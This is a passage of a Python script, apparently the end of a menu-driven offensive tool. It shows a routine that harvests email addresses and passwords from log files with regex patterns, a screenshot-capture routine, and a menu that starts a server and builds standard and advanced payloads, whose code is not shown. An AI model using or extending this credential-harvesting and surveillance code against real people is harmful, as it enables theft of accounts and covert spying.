    print(f"[*] Classifying log file: {input_file}")
    
    import re
    
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    password_patterns = [
        r'(?:password|passwd|pwd|pass)[:\s=]+([^\s\n]+)',
        r'(?:mot de passe|mdp)[:\s=]+([^\s\n]+)',
    ]
    
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        emails = set(re.findall(email_pattern, content, re.IGNORECASE))
        
        passwords = set()
        for pattern in password_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            passwords.update(matches)
        
        print("\n[+] Emails found:")
        for email in emails:
            print(f"    {email}")
        
        print("\n[+] Potential passwords found:")
        for pwd in passwords:
            print(f"    {pwd}")
            
    except FileNotFoundError:
        print(f"[!] File not found: {input_file}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")

def run_screenshot():
    target = get_target_platform()
    output_dir = get_output_dir()
    filename = get_filename()
    
    print(f"[*] Taking screenshot on platform: {target}")
    print(f"    Output: {output_dir}/{filename}.png")
    
    try:
        global_screencapture(platform=target, folder=output_dir, filename=filename)
        print(f"[+] Screenshot saved successfully!")
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")

# ============================================
# MAIN ENTRY POINT
# ============================================

if __name__ == "__main__":
    if usecase == 'help':
        print_help()
    elif usecase == '1':
        print_banner()
        run_start()
    elif usecase == 'start_server':
        print_banner()
        run_serve()
    elif usecase == '3':
        print_banner()
        run_build_standard()
    elif usecase == '3_advanced':
        print_banner()
        run_build_advanced()
    elif usecase == '4':
        print_banner()
        run_classify()
    elif usecase == '5':
        print_banner()
        run_screenshot()
    else:
        print_help()